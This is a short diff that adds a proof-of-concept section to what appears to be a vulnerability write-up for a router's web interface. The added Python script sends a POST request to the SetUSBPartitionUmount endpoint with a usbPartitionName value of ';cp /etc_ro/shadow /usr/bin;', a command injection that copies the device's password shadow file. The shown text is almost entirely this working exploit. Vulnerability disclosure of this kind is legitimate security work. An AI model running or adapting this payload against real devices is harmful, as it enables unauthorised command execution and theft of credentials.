@@ -20,5 +20,14 @@ In this function, use the cJSON_GetString function to obtain the "usbPartitionNa
 
 
 ## POC
+    import requests
 
+    url = "http://192.168.244.130/goform/SetUSBPartitionUmount"
+    cmds = ";cp /etc_ro/shadow /usr/bin;"
+
+
+    payload = {'usbPartitionName': cmds}
+    r = requests.post(url, data=payload)
+    print(r.status_code)
+    print(r.content)
     
